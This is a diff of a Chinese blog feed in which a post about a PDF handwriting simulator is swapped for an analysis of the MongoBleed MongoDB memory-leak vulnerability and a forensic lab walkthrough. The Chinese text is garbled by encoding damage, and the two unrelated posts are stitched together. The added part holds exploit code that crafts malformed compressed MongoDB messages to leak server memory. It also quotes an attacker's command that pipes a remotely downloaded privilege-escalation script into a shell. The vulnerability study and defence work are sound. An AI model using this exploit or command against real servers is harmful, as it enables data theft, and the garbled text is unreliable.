+<pre><code class="language-python">def check_vulnerability(host, port):
+    hacker_loading("Probing target defenses", 1)
+    test_offsets = [100, 500, 1000, 1500, 2000, 3000]
+    for offset in test_offsets:
+        response = send_probe(host, port, offset, offset + 500)
+        if extract_leaks(response):
+            return True
+    return False
+</code></pre>
+<p>éè¿ä¸åç"åç§»éï¼offsetï¼"åéè¯·æ±ï¼åªè¦è½ä»ååºä¸­æåå°éé¢ææ°æ®ï¼å°±å¤å®ç®æ æ¼æ´æªä¿®å¤ã</p>
+<p>ç¬¬ä¸æ­¥ï¼</p>
+<p><code>send_probe()</code>æé payload</p>
+<pre><code class="language-python"># 1. æé ç¸å½¢çBSONææ¡£ï¼MongoDBçæ°æ®æ ¼å¼ï¼
+content = b'\x10a\x00\x01\x00\x00\x00'
+bson = struct.pack('&lt;i', doc_len) + content  # ä¼ªé ææ¡£é¿åº¦ï¼å³é®æ¼æ´è§¦åç¹ï¼
+
+# 2. å°è£ä¸ºMongoDBçOP_MSGæ¶æ¯
+op_msg = struct.pack('&lt;I', 0) + b'\x00' + bson
+
+# 3. åç¼©æ¶æ¯ï¼è§¦åæ¼æ´çå³é®æä½ï¼
+compressed = zlib.compress(op_msg)
+
+# 4. æé æç»æ¶æè½½è·ï¼åå«åç¼©æ è¯+ç¸å½¢æ°æ®ï¼
+payload = struct.pack('&lt;I', 2013) + struct.pack('&lt;i', buffer_size) + struct.pack('B', 2) + compressed
+
+# 5. å ä¸MongoDBåè®®å¤´ï¼åéç»ç®æ 
+header = struct.pack('&lt;IIII', 16 + len(payload), 1, 0, 2012)
+sock.sendall(header + payload)
+</code></pre>
 <ol>
-<li>
-<p><strong>è¡çº§æ°å¨ï¼æ´è¡ä¸è§åæ§ï¼</strong><br>
-éå¯¹æ¯ä¸è¡æå­ï¼æ·»å æ´ä½çåç§»åå¾æï¼æ¨¡ææåæ¶ãè¡ä¸ç´ãç¥æåç§»ãçç¹ç¹ï¼å¯¹åºä¸ä¸ªåæ°ï¼</p>
-<ul>
-<li>è¡å·¦å³å¹³ç§»ï¼<code>line_jitter_x</code>ï¼ï¼éæºçæ <code>-line_jitter_x ~ line_jitter_x</code> èå´åçåç§»é <code>line_dx</code>ï¼ä½¿æ¯è¡æå­å·¦å³è½»å¾®æå¨ï¼</li>
-<li>è¡ä¸ä¸å¹³ç§»ï¼<code>line_jitter_y</code>ï¼ï¼éæºçæ <code>-line_jitter_y ~ line_jitter_y</code> èå´åçåç§»é <code>line_dy</code>ï¼ä½¿è¡ä¸è¡ä¹é´çé´è·ç¥æå·®å¼ï¼</li>
-<li>è¡æ´è¡å¾æï¼<code>line_tilt</code>ï¼ï¼éæºçæå¾æè§åº¦ <code>line_angle_deg</code>ï¼è½¬æ¢ä¸ºå¼§åº¦åï¼éè¿ <code>tilt_y_offset = (curr_x - line_start_x) * math.tan(line_angle_rad)</code> è®¡ç®æ¯ä¸ªå­ç¬¦çYè½´åç§»ï¼å®ç°æ´è¡è½»å¾®å¾æã</li>
-</ul>
-<pre><code class="language-python"># è¡çº§æ°å¨åæ°è®¡ç®
-line_dx = random.uniform(-p_line['line_jitter_x'].get(), p_line['line_jitter_x'].get())
-line_dy = random.uniform(-p_line['line_jitter_y'].get(), p_line['line_jitter_y'].get())
-line_angle_deg = random.uniform(-p_line['line_tilt'].get(), p_line['line_tilt'].get())
-line_angle_rad = math.radians(line_angle_deg)
-</code></pre>
-</li>
-<li>
-<p><strong>å­ç¬¦çº§æ°å¨ï¼åä¸ªå­ç¬¦ä¸è§åæ§ï¼</strong><br>
-éå¯¹æ¯ä¸ªå­ç¬¦ï¼æ·»å ä½ç½®ãå¤§å°ãæè½¬çç»å¾®å·®å¼ï¼æ¨¡ææåæ¶ãæ¯ä¸ªå­å¤§å°ä¸ä¸ãç¥ææå¨ãçç¹ç¹ï¼å¯¹åºä¸ä¸ªåæ°ï¼</p>
-<ul>
-<li>å­ä½ç½®æå¨ï¼<code>jitter_pos</code>ï¼ï¼éæºçæ <code>(-jitter_pos ~ jitter_pos)</code> çXãYåç§»éï¼ä½¿å­ç¬¦è±ç¦»ä¸¥æ ¼çæ°´å¹³å¯¹é½ï¼</li>
-<li>å­å¤§å°æå¨ï¼<code>jitter_size</code>ï¼ï¼å¨åºç¡å­ä½å¤§å°ä¸ï¼éæºå¢å <code>(-jitter_size ~ jitter_size)</code> çæ°å¼ï¼çæ <code>char_jitter_fs</code>ï¼ä½¿å­ç¬¦å¤§å°ç¥æå·®å¼ï¼</li>
-<li>å­æè½¬æå¨ï¼<code>jitter_rot</code>ï¼ï¼éæºçæ <code>(-jitter_rot ~ jitter_rot)</code> çæè½¬è§åº¦ï¼å å è¡å¾æè§åº¦åï¼éè¿ <code>morph</code> åæ°å®ç°å­ç¬¦è½»å¾®æè½¬ã</li>
-</ul>
-<pre><code class="language-python"># å­ç¬¦çº§æ°å¨åæ°è®¡ç®
-char_jitter_x = random.uniform(-p['jitter_pos'].get(), p['jitter_pos'].get())
-char_jitter_y = random.uniform(-p['jitter_pos'].get(), p['jitter_pos'].get())
-char_jitter_rot = random.uniform(-p['jitter_rot'].get(), p['jitter_rot'].get())
-char_jitter_fs = f_size + random.uniform(-p['jitter_size'].get(), p['jitter_size'].get())
-</code></pre>
-</li>
-<li>
-<p><strong>éæºæ°æ§å¶ï¼é¢è§ç¨³å® + å®ééæºï¼</strong><br>
-ä¸ºäºä¿è¯å®æ¶é¢è§æ¶ææç¨³å®å¯è°æ´ï¼è®¾ç½®éæºæ°ç§å­ <code>random.seed(42)</code> åºå®æ°å¨ææï¼å®éåºç¨ç¬è¿¹æ¶ï¼ä¸è®¾ç½®ç§å­ <code>random.seed()</code>ï¼çæéæºçæ°å¨ææï¼è®©æ¯æ¬¡çæçæåé£æ ¼ç¥æå·®å¼ï¼æ´è´´è¿çå®åºæ¯ã</p>
-<pre><code class="language-python">if is_preview: random.seed(42)  # é¢è§æ¨¡å¼ï¼åºå®éæºæ°ï¼ææç¨³å®
-else: random.seed()  # å®éçæï¼éæºç§å­ï¼æææ´çå®
-</code></pre>
-</li>
+<li>ä¼ªé çBSONææ¡£é¿åº¦(doc_len)ä¸å®éåå®¹ä¸å¹é</li>
+<li>å¯¹è¯·æ±è¿è¡zlibåç¼©åï¼MongoDBçè§£å/è§£æé»è¾å­å¨ç¼ºé·ï¼å¯¼è´åå­è¶çè¯»å</li>
+<li>æ»å»èéè¿æ§å¶doc_lenåbuffer_sizeï¼ç¼å²åºå¤§å°ï¼ï¼ç²¾åæ§å¶åå­è¯»åçèå´</li>
 </ol>
-<h1 id="æ»ç»">æ»ç»</h1>
-<p>è¿æ¬¾ PDF æåæ¨¡æå¨å®ç¾è§£å³äºæåä½ä¸ãå®éªæ¥åççç¹ï¼å¼å·ãå®ç¨æ§ãåãçµæ´»æ§ãï¼</p>
-<ol>
-<li><strong>å®ç¨æ§ææ»¡</strong>ï¼æ éæå¨æåï¼ä¸é®çææåé£æ ¼ PDFï¼èçå¤§éæ¶é´åç²¾åï¼çæææé«åº¦è´´è¿çå®æåï¼</li>
-<li><strong>èªå®ä¹æ§å¼º</strong>ï¼ä¸­æ/è±æç¬ç«éç½®ï¼æ¯æå­ä½ãé¢è²ãå¤§å°ãå­è·è¡è·è°æ´ï¼å¤å±æ°å¨åæ°å¯ç²¾ç»è°æ§æåé£æ ¼ï¼</li>
-<li><strong>æä½ä¾¿æ·</strong>ï¼å¯è§åçé¢åå¥½ï¼æ¯æå®æ¶é¢è§ãæ¤éãæ¦é¤ãæ¨¡çå¤ç¨ï¼é¶åºç¡ç¨æ·ä¹è½å¿«éä¸æï¼</li>
-<li><strong>ææ¯è½»éå</strong>ï¼åºäº Python å¸¸ç¨åºå¼åï¼æ éå¤æç¯å¢éç½®ï¼ä»£ç å¯çµæ´»ä¿®æ¹æ©å±ã</li>
-</ol>
-<p>å½ç¶ï¼è¿æ¬¾å·¥å·è¿æä¼åç©ºé´ï¼æ¯å¦æ¯æè¿ç¬ææãç¬è¿¹ç²ç»ååãæ¹éå¤çå¤ä¸ª PDF ç­ãå¦æå¤§å®¶æç±»ä¼¼éæ±ï¼å¯ä»¥åºäºè¿ä»½ä»£ç è¿è¡äºæ¬¡å¼åï¼ééèªå·±çä½¿ç¨åºæ¯ãå¸æè¿æ¬¾å·¥å·è½å¸®å¤§å®¶è§£æ¾åæï¼ææ´å¤æ¶é´æå¥å°æ ¸å¿å­¦ä¹ åç ç©¶ä¸­ï¼</p>
-<p><strong>ä»£ç å·²ç»å¼æºå¨Githubï¼<a href="https://github.com/ChenAI-TGF/PDF_HandWrite" target="_blank" rel="noopener nofollow">https://github.com/ChenAI-TGF/PDF_HandWrite</a><br>
-æ¬¢è¿å¤§å®¶ä¸è½½ï¼å¦æè§å¾æç¨çè¯å¯ä»¥ç»æç¹ä¸ªStarï¼ä¸åæè°¢ï¼ï¼<br>
-å¦æç»ä¸ä¸Githubçè¯ä¹æ¬¢è¿ç´æ¥ç§ä¿¡åä¸»è¦ä»£ç </strong></p>
+<p>ç¬¬åæ­¥ï¼</p>
+<p>åéè¯·æ±å¹¶æ¥æ¶æ³é²æ°æ®ï¼send_probe()åç»­é»è¾ï¼</p>
+<pre><code class="language-python">response = b''
+while len(response) &lt; 4 or len(response) &lt; struct.unpack('&lt;I', response[:4])[0]:
+    chunk = sock.recv(4096) #æç»­æ¥åååºï¼ç´å°å®æ´è¯»åï¼
+    if not chunk: break
+    response += chunk
+</code></pre>
+<p>è·åç®æ è¿åçãåå«åå­æ³æ¼æ°æ®çååºå</p>
+<p>ç¬¬äºæ­¥ï¼</p>
+<p>æåæ³é²çåå­æ°æ®å³ extract_leakså½æ°</p>
+<p>æ¹éæå+ææä¿¡æ¯è¯å«<code>run_exploit()</code> + <code>analyze_secrets()</code></p>
+<p>è¿æä¿å­æ»å»ç»æï¼æä¹ålootï¼</p>
+<p>æ»å»æ»ç»ï¼</p>
+<p><img src="https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152113901-643757865.png" alt="image-20260102153604895" loading="lazy"></p>
+<p>åå°æºç </p>
+<p><a href="https://github.com/mongodb/mongo/blob/r8.0.16/src/mongo/transport/message_compressor_zlib.cpp" target="_blank" rel="noopener nofollow">https://github.com/mongodb/mongo/blob/r8.0.16/src/mongo/transport/message_compressor_zlib.cpp</a></p>
+<p><img src="https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152114375-627847864.png" alt="image-20260102154747986" loading="lazy"></p>
+<p>åæ¬ç¨äºè¿åè§£åæ°æ®å¤§å°çè¡ä½¿ç¨äº<code>return {output.length()};</code>è¿è¡ä»£ç ï¼å®åè¯ä»£ç è¿åå·²åéçåå­éï¼èä¸æ¯è§£åæ°æ®çå®éé¿åº¦ãæ°ç<code>return {length};</code>ç¡®ä¿åªè¿åè§£åç¼©æ°æ®çå®éé¿åº¦ã</p>
+<p><a href="https://github.com/mongodb/mongo/blob/master/src/mongo/transport/message_compressor_zlib.cpp" target="_blank" rel="noopener nofollow">https://github.com/mongodb/mongo/blob/master/src/mongo/transport/message_compressor_zlib.cpp</a></p>
+<p><img src="https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152114721-1137957807.png" alt="image-20260102155010199" loading="lazy"></p>
+<p>è¿ä¸æ­¥åæå¯ä»¥åç°ï¼å¨æ°ç<code>src/mongo/transport/message_compressor_manager_test.cpp</code>ä¸­å¤äºä¸ä¸ªcheckUndersizeå½æ°</p>
+<pre><code class="language-cpp">void checkUndersize(const Message&amp; compressedMsg,
+                    std::unique_ptr&lt;MessageCompressorBase&gt; compressor) {
+    MessageCompressorRegistry registry;
+    const auto compressorName = compressor-&gt;getName();
+
+    std::vector&lt;std::string&gt; compressorList = {compressorName};
+    registry.setSupportedCompressors(std::move(compressorList));
+    registry.registerImplementation(std::move(compressor));
+    registry.finalizeSupportedCompressors().transitional_ignore();
+
+    MessageCompressorManager mgr(&amp;registry);
+    BSONObjBuilder negotiatorOut;
+    std::vector&lt;StringData&gt; negotiator({compressorName});
+    mgr.serverNegotiate(negotiator, &amp;negotiatorOut);
+    checkNegotiationResult(negotiatorOut.done(), {compressorName});
+
+    auto swm = mgr.decompressMessage(compressedMsg);
+    ASSERT_EQ(ErrorCodes::BadValue, swm.getStatus());
+}
+</code></pre>
+<p>æ ¸å¿é»è¾å¨</p>
+<p><img src="https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152115003-534946274.png" alt="image-20260102155616512" loading="lazy"></p>
+<p><code>mgr.decompressMessage(compressedMsg)</code>:è°ç¨åç¼©å¨ç®¡çå¨è§£åä¼ å¥çâå¼å¸¸âçåç¼©æ¶æ¯</p>
+<p><code>ASSERT_EQ(ErrorCodes::BadValue, swm.getStatus())</code>ï¼ååæµè¯æ­è¨</p>
+<p>ä¸»è¦ç®çæ¯éªè¯å½ä¼ å¥ä¸ä¸ª âå°ºå¯¸å¼å¸¸ï¼undersizeï¼â çåç¼©æ¶æ¯æ¶ï¼æ¶æ¯è§£åé»è¾è½æ­£ç¡®è¿å <code>ErrorCodes::BadValue</code> éè¯¯ç </p>
+<p>åæ¶å¨ä¸é¢ä¹ç»å°äºæµè¯ç¨ä¾</p>
+<p><img src="https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152115354-1662843965.png" alt="image-20260102155917477" loading="lazy"></p>
+<p>éç¹çä¸ä¸Zlibçæµè¯ç¨ä¾</p>
+<pre><code class="language-cpp">TEST(ZlibMessageCompressor, Undersize) {
+    // 1. æé Zlibç®æ³çâå°ºå¯¸å¼å¸¸âäºè¿å¶æ¶æ¯æ°æ®
+    std::vector&lt;std::uint8_t&gt; payload = {
+        0x3c, 0x00, 0x00, 0x00, 0xad, 0xde, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xdc, 0x07, 0x00,
+        0x00, 0xdd, 0x07, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x02, 0x78, 0xda, 0x63, 0x60, 0x00,
+        0x82, 0xdf, 0xf2, 0x0c, 0x0c, 0xac, 0xf1, 0x99, 0x29, 0x0c, 0x0c, 0x02, 0x40, 0x9e, 0x87,
+        0xab, 0x63, 0x80, 0x8f, 0xab, 0xa3, 0x37, 0x03, 0x12, 0x00, 0x00, 0x6d, 0x26, 0x04, 0x97};
+
+    // 2. åéç¼å²åºå¹¶æ·è´æ°æ®
+    auto buffer = SharedBuffer::allocate(payload.size());
+    std::copy(payload.begin(), payload.end(), buffer.get());
+
+    // 3. è°ç¨æµè¯å½æ°ï¼ä¼ å¥å¼å¸¸æ¶æ¯ + Zlibåç¼©å¨å®ä¾
+    checkUndersize(Message(buffer), std::make_unique&lt;ZlibMessageCompressor&gt;());
+}
+</code></pre>
+<table>
+<thead>
+<tr>
+<th>å­èèå´</th>
+<th>å«ä¹</th>
+<th>å¯¹åº payload å¼</th>
+<th>è¯´æ</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0-3</td>
+<td>æ¶æ¯æ»é¿åº¦ï¼å°ç«¯åº uint32ï¼</td>
+<td>0x3c 0x00 0x00 0x00</td>
+<td>è§£æä¸ºåè¿å¶ 60 â å£°ææ¶æ¯æ»é¿åº¦æ¯ 60 å­è</td>
+</tr>
+<tr>
+<td>4-7</td>
+<td>é­æ° / æ è¯</td>
+<td>0xad 0xde 0x00 0x00</td>
+<td>MongoDB èªå®ä¹çåç¼©æ¶æ¯æ è¯ï¼0xADDE æ¯åºå®å¼ï¼</td>
+</tr>
+<tr>
+<td>8-11</td>
+<td>ä¿çå­æ®µ</td>
+<td>0x00 0x00 0x00 0x00</td>
+<td>æ å®éæä¹ï¼å ä½</td>
+</tr>
+<tr>
+<td>12-15</td>
+<td>åç¼©å¨ç±»åï¼å°ç«¯åº uint32ï¼</td>
+<td>0xdc 0x07 0x00 0x00</td>
+<td>è§£æä¸ºåè¿å¶ 2012 â æ è¯è¿æ¯ Zlib åç¼©çæ°æ®ï¼ä¸ååç¼©å¨æä¸å±æ°å¼ï¼</td>
+</tr>
+<tr>
+<td>16-19</td>
+<td>ä¿çå­æ®µ</td>
+<td>0xdd 0x07 0x00 0x00</td>
+<td>å ä½</td>
+</tr>
+<tr>
+<td>20-23</td>
+<td>åå§æ°æ®é¿åº¦ï¼å°ç«¯åº uint32ï¼</td>
+<td>0x00 0x20 0x00 0x00</td>
+<td>è§£æä¸ºåè¿å¶ 8192 â å£°æè§£åååå§æ°æ®é¿åº¦æ¯ 8192 å­è</td>
+</tr>
+<tr>
+<td>24</td>
+<td>åç¼©ç®æ³æ è¯</td>
+<td>0x02</td>
+<td>Zlib çç®æ³æ è¯ï¼Snappy æ¯ 0x01ï¼Zstd æ¯ 0x03ï¼</td>
+</tr>
+<tr>
+<td>25+</td>
+<td>Zlib åç¼©æ°æ®ä½</td>
+<td>0x78 0xda ... 0x04 0x97</td>
+<td>Zlib æ ¼å¼çåç¼©æ°æ®ï¼ä½è¢«æææé ä¸º âå°ºå¯¸ä¸è¶³âï¼</td>
+</tr>
+</tbody>
+</table>
+<ul>
+<li>å¤´é¨å£°æ âåå§æ°æ®é¿åº¦æ¯ 8192 å­èâï¼ä½å®éç Zlib åç¼©æ°æ®ä½åªæ <code>60-25=35</code> å­è â è¿ä¸è¶³ä»¥è§£ååº 8192 å­èçåå§æ°æ®ï¼è§£åé»è¾ä¼æ£æµå° âæ°æ®å°ºå¯¸ä¸è¶³âã</li>
+</ul>
+<p><img src="https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152115814-318572431.png" alt="image-20260102160356664" loading="lazy"></p>
+<h3 id="æ¼æ´ä¿®å¤">æ¼æ´ä¿®å¤</h3>
+<p>1.ç«å³åçº§å°<strong>å·²ä¿®å¤çæ¬</strong>ï¼</p>
+<p>ç«å³åçº§å°ï¼</p>
+<ul>
+<li>8.2.3ã8.0.17ã7.0.28ã6.0.27ã5.0.32ã4.4.30</li>
+<li>MongoDB Atlasï¼æç®¡çï¼å·²èªå¨ä¿®å¤ã</li>
+</ul>
+<p>2.<strong>ä¸´æ¶ç¼è§£</strong>ï¼<br>
+ç¦ç¨ <code>zlib</code> åç¼©<br>
+ï¼å¯å¨åæ°ï¼<code>--networkMessageCompressors=snappy,zstd</code> æéç½®æä»¶ä¸­æé¤ zlibï¼<br>
+ä¸è¦å°27017ç«¯å£æ´é²å¨äºèç½<br>
+æ°æ®åºè®¿é®è®¾ç½®ç½åå,ä¸è¦è®¾ç½®ä»»ä½ipå¯è®¿é®</p>
+<h2 id="task2">Task2</h2>
+<p>What is the version of MongoDB installed on the server that the CVE exploited?</p>
+<p>åæä½äº<code>MangoBleed\uac-mongodbsync-linux-triage\[root]\var\log\mongodb\mongod.log</code></p>
+<p><img src="https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152116177-1760271411.png" alt="image-20260102161150999" loading="lazy"></p>
+<p>8.0.16</p>
+<h2 id="task3">Task3</h2>
+<p>Analyze the MongoDB logs to identify the attackerâs remote IP address used to exploit the CVE.</p>
+<p>å¨æ¥å¿ä¸­å³æ³¨äºä»¶ID22943(è¿æ¥)åID22944(æ­å¼è¿æ¥)</p>
+<p>65.0.76.43</p>
+<p>æä»¬ä¹å¯ä»¥ç¨å·¥å·è¿è¡åæ</p>
+<p><a href="https://github.com/Neo23x0/mongobleed-detector" target="_blank" rel="noopener nofollow">https://github.com/Neo23x0/mongobleed-detector</a></p>
+<pre><code class="language-kotlin"># Shell script dependencies
+# Debian/Ubuntu
+apt-get install jq gawk gzip
+
+# RHEL/CentOS/Fedora
+dnf install jq gawk gzip
+
+# macOS
+brew install jq gawk
+
+# Python remote scanner has no additional dependencies
+# Uses native ssh/scp commands
+
+
+# Clone the repository
+git clone https://github.com/your-org/mongobleed-detector.git
+cd mongobleed-detector
+
+# Make executable
+chmod +x mongobleed-detector.sh
+</code></pre>
+<pre><code class="language-kotlin">./mongobleed-detector.sh --no-default-paths -p ./mongod.log -t 10000
+</code></pre>
+<p><img src="https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152116518-329116859.png" alt="image-20260102164314888" loading="lazy"></p>
+<h2 id="task4">Task4</h2>
+<p>Based on the MongoDB logs, determine the exact date and time the attackerâs exploitation activity began (the earliest confirmed malicious event)</p>
+<p><img src="https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152116838-1010417894.png" alt="image-20260102164437061" loading="lazy"></p>
+<p>æ ¹æ®ä¸å¾å¯ä»¥çå°</p>
+<p>2025-12-29 05:25:52</p>
+<h2 id="task5">Task5</h2>
+<p>Using the MongoDB logs, calculate the total number of malicious connections initiated by the attacker.</p>
+<p>åæ ·å¨ä¸å¾</p>
+<p><img src="https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152117142-1389182106.png" alt="image-20260102165143240" loading="lazy"></p>
+<ul>
+<li><strong>Risk</strong>ï¼é£é©ç­çº§ï¼è¿éæ¯<code>HIGH</code>ï¼è¡¨ç¤ºé«é£é©ï¼</li>
+<li><strong>SourceIP</strong>ï¼æ¥æº IP å°åï¼è¿éæ¯<code>65.0.76.43</code>ï¼</li>
+<li><strong>ConnCount</strong>ï¼è¿æ¥æ¬¡æ°ï¼37630 æ¬¡ï¼ç­æ¶é´åå¤§éè¿æ¥ï¼</li>
+<li><strong>MetaCount</strong>ï¼åæ°æ®æä½æ¬¡æ°ï¼0 æ¬¡ï¼</li>
+<li><strong>DiscCount</strong>ï¼æ­å¼è¿æ¥æ¬¡æ°ï¼37630 æ¬¡ï¼åè¿æ¥æ°ä¸è´ï¼è¯´æè¿æ¥åç«å³æ­å¼ï¼</li>
+<li><strong>MetaRate%</strong>ï¼åæ°æ®æä½å æ¯ï¼0.00%ï¼</li>
+<li><strong>BurstRate/m</strong>ï¼æ¯åéçåè¿æ¥æ°ï¼30104 æ¬¡ï¼ç­æ¶é´åè¿æ¥é¢çæé«ï¼</li>
+<li><strong>First/LastSeen</strong>ï¼é¦æ¬¡ / æåä¸æ¬¡åºç°çæ¶é´ï¼2025-12-29 ç 2 åéåå®æäºå¤§éè¿æ¥ï¼</li>
+</ul>
+<p>æä»¥æ»å±ä¸º75260</p>
+<p>75260</p>
+<h2 id="task6">Task6</h2>
+<p>The attacker gained remote access after a series of bruteâforce attempts. The attack likely exposed sensitive information, which enabled them to gain remote access. Based on the logs, when did the attacker successfully gain interactive hands-on remote access?</p>
+<p>è®¿é®/var/log/auth.logæ¥å¿</p>
+<p><img src="https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152117520-781480417.png" alt="image-20260102171320748" loading="lazy"></p>
+<p>2025-12-29 05:40:03</p>
+<h2 id="task7">Task7</h2>
+<p>Identify the exact command line the attacker used to execute an inâmemory script as part of their privilegeâescalation attempt.</p>
+<p><img src="https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152117901-872419183.png" alt="image-20260102172751711" loading="lazy"></p>
+<p>ç¡®å®ç¨æ·ä¸ºmongoadmin</p>
+<p><code>uac-mongodbsync-linux-triage\[root]\home\mongoadmin</code>ä¸ç.bash_historyæä»¶ä¸­</p>
+<p><img src="https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152118284-543519413.png" alt="image-20260102172905804" loading="lazy"></p>
+<p><code>curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh</code></p>
+<h2 id="task8">Task8</h2>
+<p>The attacker was interested in a specific directory and also opened a Python web server, likely for exfiltration purposes. Which directory was the target?</p>
+<p><img src="https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152118612-1268812667.png" alt="image-20260102173145834" loading="lazy"></p>
+<p>åæ ·å»åæä¸ä¸</p>
+<p>/var/lib/mongodb</p>
+<p><img src="https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152119029-1224398251.png" alt="image-20260102173140081" loading="lazy"></p>
+<p>æç« åé´ï¼</p>
+<p><a href="https://www.cnblogs.com/hzhsec/p/19428472" target="_blank">https://www.cnblogs.com/hzhsec/p/19428472</a></p>
+<p><a href="https://www.gm7.org/archives/16179" target="_blank" rel="noopener nofollow">https://www.gm7.org/archives/16179</a></p>
+<p><strong>åè´£å£°æ</strong></p>
+<p>æ¬ææ¡£<code>MongoDBæ¼æ´å¤ç°ï¼CVE-2025-14847ï¼</code>æåå«çæ¼æ´å¤ç°æ¹æ³ãææ¯ç»èåå©ç¨ä»£ç ï¼<strong>ä»éç¨äºææçå®å¨æµè¯ãæè²å­¦ä¹ ä¸ç ç©¶ç®ç</strong>ã</p>
 
 </div>
 <div class="clear"></div>
 
             </div>
             <div class="postDesc">posted @ 
-<span id="post-date" data-last-update-days="0" data-date-updated="2026-01-01 15:59">2026-01-01 15:59</span>&nbsp;
-<a href="https://www.cnblogs.com/ChenAI-TGF">TTGF</a>&nbsp;
-éè¯»(<span id="post_view_count">143</span>)&nbsp;
-è¯è®º(<span id="post_comment_count">1</span>)&nbsp;
+<span id="post-date" data-last-update-days="0" data-date-updated="2026-01-03 15:22">2026-01-03 15:22</span>&nbsp;
+<a href="https://www.cnblogs.com/DSchenzi">dynasty_chenzi</a>&nbsp;
+éè¯»(<span id="post_view_count">4</span>)&nbsp;
+è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
 &nbsp;
-<a href="javascript:void(0)" onclick="AddToWz(19430267);return false;">æ¶è</a>&nbsp;
-<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19430267', targetLink: 'https://www.cnblogs.com/ChenAI-TGF/p/19430267', title: 'å®ç¨ç¨åºï¼è§£æ¾åæï¼Python æé  PDF æåæ¨¡æå¨ï¼è½»æ¾æå®æåä½ä¸' })">ä¸¾æ¥</a>
+<a href="javascript:void(0)" onclick="AddToWz(19434377);return false;">æ¶è</a>&nbsp;
+<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19434377', targetLink: 'https://www.cnblogs.com/DSchenzi/p/19434377', title: 'æ·±åº¦åæMangoBleed(CVE-2025-14847)' })">ä¸¾æ¥</a>
 </div>
          ]]>
     </description>
@@ -2273,8 +2247,8 @@ set tabstop=8
             <div class="postDesc">posted @ 
 <span id="post-date" data-last-update-days="0" data-date-updated="2026-01-03 01:05">2026-01-03 01:04</span>&nbsp;
 <a href="https://www.cnblogs.com/young-tea">young_tea</a>&nbsp;
-éè¯»(<span id="post_view_count">79</span>)&nbsp;
-è¯è®º(<span id="post_comment_count">1</span>)&nbsp;
+éè¯»(<span id="post_view_count">120</span>)&nbsp;
+è¯è®º(<span id="post_comment_count">2</span>)&nbsp;
 &nbsp;
 <a href="javascript:void(0)" onclick="AddToWz(19433114);return false;">æ¶è</a>&nbsp;
 <a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19433114', targetLink: 'https://www.cnblogs.com/young-tea/p/19433114', title: 'æä¸ºä»ä¹ç¨æ­»äº¡ç»èç»ä¹  vim' })">ä¸¾æ¥</a>
